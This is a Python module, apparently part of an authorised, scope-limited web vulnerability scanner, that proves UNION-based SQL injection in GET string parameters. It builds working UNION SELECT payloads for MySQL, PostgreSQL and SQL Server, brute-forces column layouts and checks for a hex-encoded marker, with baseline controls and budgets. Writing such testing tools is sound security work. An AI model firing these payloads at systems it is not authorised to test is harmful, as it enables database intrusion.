"""Conservative UNION-based SQLi proof for an observed string GET field.

Boolean/time lanes infer injection from a yes/no oracle; UNION proves it by
making the database *emit attacker-chosen bytes* into the response. The trick
that rules out plain reflection is a server-owned marker that never appears in
the request literally: the payload carries only an encoded expression (a hex or
CHAR() literal) that the database must decode and concatenate into the result
set. If the decoded plaintext marker then appears in the body, only query
execution can have produced it — reflecting the raw parameter would echo the
encoded bytes, not the plaintext.

Discipline mirrors the other scoped SQLi lanes:

* Payloads are server-owned; the model only selects a mapped, ordinary observed
  input. A fresh nonce makes the marker unique per run and lets an independent
  verifier prove the same input without reusing the hunter's request.
* Column count and the reflected cell are discovered within a bounded request
  budget. The confirm recipe then repeats the successful payload with fast
  negative controls (baselines that must not contain the marker).
* A wrong family or column layout simply never reflects the marker, so the lane
  fails safe instead of producing a false positive.
"""

from __future__ import annotations

import re
import secrets
from collections.abc import Callable
from urllib.parse import quote, unquote_plus, urlsplit, urlunsplit

from .browser import assert_in_scope, origin
from .browser_actions import allowed_discovery_path
from .http_observe import observe_get
from .sqli_string import _SAFE_VALUE, _observed_value, observed_query_encoding

# Bounded discovery. Column counts 1..MAX_COLUMNS, marker tried in each position,
# capped by MAX_DISCOVERY total probes so a dead endpoint cannot spend the budget.
MAX_COLUMNS = 6
MAX_DISCOVERY = 16
UNION_CHECK_ORDER = ("baseline_first", "union_first", "union_second", "baseline_last")
FAMILIES = ("mysql", "postgresql", "sqlserver")


def marker_for(nonce: str) -> str:
    """A unique, ordinary-looking plaintext marker. Never placed in a payload."""
    return "AEGIS" + nonce + "Q"


def _encoded_marker_expression(family: str, marker: str) -> str:
    """A SQL expression that evaluates to ``marker`` without containing it.

    The database must decode the hex/char literal to produce the plaintext, so a
    reflected plaintext marker cannot be an echo of the request bytes.
    """
    hex_marker = marker.encode("ascii").hex()
    if family == "mysql":
        return f"0x{hex_marker}"
    if family == "postgresql":
        return f"CONVERT_FROM(DECODE('{hex_marker}','hex'),'UTF8')"
    if family == "sqlserver":
        return f"CONVERT(VARCHAR(MAX),0x{hex_marker})"
    raise ValueError("unsupported_sql_family")


def _union_suffix(family: str, columns: int, position: int, marker: str) -> str:
    """Build one server-owned single-statement UNION SELECT, marker at ``position``."""
    if not 1 <= columns <= MAX_COLUMNS or not 1 <= position <= columns:
        raise ValueError("column layout out of bounds")
    expr = _encoded_marker_expression(family, marker)
    cells = ["NULL"] * columns
    cells[position - 1] = expr
    body = "' UNION SELECT " + ",".join(cells) + "-- "
    return quote(body, safe="")


def _plan_target(url: str, *, parameter: str, allowed_origins: list[str], suffix: str) -> str:
    """Append a server-owned suffix to exactly one observed, ordinary string field."""
    parts = urlsplit(url)
    fields = parts.query.split("&")
    index = next(i for i, field in enumerate(fields)
                 if field and unquote_plus(field.split("=", 1)[0]) == parameter)
    name, sep, raw_value = fields[index].partition("=")
    value, encoding = _observed_value(raw_value) if sep else ("", "plain")
    changed = fields.copy()
    if encoding == "base64":
        import base64
        decoded_suffix = unquote_plus(suffix)
        encoded = base64.b64encode((value + decoded_suffix).encode()).decode()
        changed[index] = name + "=" + quote(encoded, safe="")
    else:
        changed[index] = name + "=" + raw_value + suffix
    target = urlunsplit(parts._replace(query="&".join(changed)))
    assert_in_scope(target, allowed_origins)
    return target


def validate_observed_input(url: str, *, parameter: str, allowed_origins: list[str]) -> None:
    """Mirror sqli_string's bounds: one mapped, ordinary observed GET value."""
    assert_in_scope(url, allowed_origins)
    parts = urlsplit(url)
    if parts.fragment or len(url) > 2048 or len(parts.query) > 2048:
        raise ValueError("A bounded fragment-free observed GET URL is required")
    if not allowed_discovery_path(parts.path or "/"):
        raise ValueError("State-changing path is not eligible for SQLi proof")
    fields = parts.query.split("&")
    if len(fields) > 40 or not isinstance(parameter, str) or not 0 < len(parameter) <= 80:
        raise ValueError("A single bounded query parameter is required")
    matches = [i for i, field in enumerate(fields)
               if field and unquote_plus(field.split("=", 1)[0]) == parameter]
    if len(matches) != 1:
        raise ValueError("String parameter must occur exactly once")
    _name, sep, raw_value = fields[matches[0]].partition("=")
    value = _observed_value(raw_value)[0] if sep else ""
    if not _SAFE_VALUE.fullmatch(value):
        raise ValueError("UNION SQLi proof requires an ordinary observed string value")


def union_followup_eligible(or_result: dict) -> bool:
    """Only try UNION when the Boolean baselines answered 200 and stable.

    Reuses the OR recipe's own baseline discipline so the lane stays off flaky or
    error-y endpoints. Reflection of a fresh marker is independent of body size,
    so this is purely a readiness gate.
    """
    from .sqli_string import and_fallback_eligible
    return and_fallback_eligible(or_result)


def union_sql_proof_valid(result: dict) -> bool:
    if (result.get("operation") != "sqli_union_string"
            or result.get("proof_recipe") != "string_union_v1"
            or result.get("method") != "GET" or result.get("location") != "query"
            or not result.get("target") or not result.get("parameter")
            or result.get("sql_family") not in FAMILIES
            or result.get("input_encoding", "plain") not in {"plain", "base64"}
            or not re.fullmatch(r"[1-9][0-9]{4}", str(result.get("nonce", "")))
            or not isinstance(result.get("column_count"), int)
            or not 1 <= result["column_count"] <= MAX_COLUMNS
            or not isinstance(result.get("reflected_position"), int)
            or not 1 <= result["reflected_position"] <= result["column_count"]
            or result.get("requests_sent") != len(UNION_CHECK_ORDER)):
        return False
    checks = result.get("checks")
    if not isinstance(checks, dict) or any(
        not isinstance(checks.get(key), dict) for key in UNION_CHECK_ORDER
    ):
        return False
    rows = {key: checks[key] for key in UNION_CHECK_ORDER}
    if any(row.get("status") != 200 or row.get("truncated") is not False
           or row.get("redirected") is not False
           or not isinstance(row.get("reflection_detected"), bool)
           for row in rows.values()):
        return False
    # The marker is decoded by the database only on the UNION branches. Baselines
    # carry no payload, so a marker there would mean an unrelated collision — reject.
    return (rows["baseline_first"]["reflection_detected"] is False
            and rows["baseline_last"]["reflection_detected"] is False
            and rows["union_first"]["reflection_detected"] is True
            and rows["union_second"]["reflection_detected"] is True)


def build_string_union_result(baseline: str, nonce: str, *, parameter: str, family: str,
                             column_count: int, reflected_position: int,
                             checks: dict[str, dict], browser_replay: bool = False) -> dict:
    parts = urlsplit(baseline)
    result = {
        "operation": "sqli_union_string", "proof_recipe": "string_union_v1",
        "target": origin(baseline) + (parts.path or "/"),
        "method": "GET", "location": "query", "parameter": parameter,
        "nonce": nonce, "sql_family": family,
        "column_count": column_count, "reflected_position": reflected_position,
        "requests_sent": len(UNION_CHECK_ORDER),
        "identity_transport": "named_identity_browser_state" if browser_replay
        else "named_identity_cookies_only",
        "checks": checks,
        "input_encoding": observed_query_encoding(baseline, parameter),
    }
    if browser_replay:
        result["replay_mode"] = "browser_live_get"
    result["proof_confirmed"] = union_sql_proof_valid(result)
    return result


def _observe_reflection(url: str, marker: str, allowed_origins: list[str],
                        storage_state: dict | None) -> dict:
    response = observe_get(url, allowed_origins, storage_state, reflection_marker=marker)
    return {name: response[name] for name in (
        "status", "content_type", "bytes_captured", "truncated",
        "body_sha256", "redirected", "reflection_detected",
    )}


def probe_string_union(
    baseline: str, *, parameter: str, family: str, allowed_origins: list[str],
    storage_state: dict | None, before_request: Callable[[], object],
) -> dict | None:
    """Discover (column_count, reflected cell) then confirm with repeated controls.

    Returns ``None`` when no layout within the bounded budget reflects the marker
    (the endpoint is not UNION-injectable for this family). A returned result is a
    complete receipt whose ``proof_confirmed`` reflects the recipe validation.
    """
    if family not in FAMILIES:
        raise ValueError("unsupported_sql_family")
    validate_observed_input(baseline, parameter=parameter, allowed_origins=allowed_origins)
    nonce = str(secrets.randbelow(90000) + 10000)
    marker = marker_for(nonce)

    found: tuple[int, int] | None = None
    probes = 0
    for columns in range(1, MAX_COLUMNS + 1):
        for position in range(1, columns + 1):
            if probes >= MAX_DISCOVERY:
                break
            probes += 1
            before_request()
            suffix = _union_suffix(family, columns, position, marker)
            target = _plan_target(baseline, parameter=parameter,
                                  allowed_origins=allowed_origins, suffix=suffix)
            row = _observe_reflection(target, marker, allowed_origins, storage_state)
            if (row["status"] == 200 and row["reflection_detected"] is True
                    and row["truncated"] is False and row["redirected"] is False):
                found = (columns, position)
                break
        if found or probes >= MAX_DISCOVERY:
            break
    if not found:
        return None

    columns, position = found
    suffix = _union_suffix(family, columns, position, marker)
    union_url = _plan_target(baseline, parameter=parameter,
                            allowed_origins=allowed_origins, suffix=suffix)
    urls = {
        "baseline_first": baseline, "union_first": union_url,
        "union_second": union_url, "baseline_last": baseline,
    }
    checks = {}
    for key in UNION_CHECK_ORDER:
        before_request()
        checks[key] = _observe_reflection(urls[key], marker, allowed_origins, storage_state)
    return build_string_union_result(
        baseline, nonce, parameter=parameter, family=family,
        column_count=columns, reflected_position=position, checks=checks,
    )
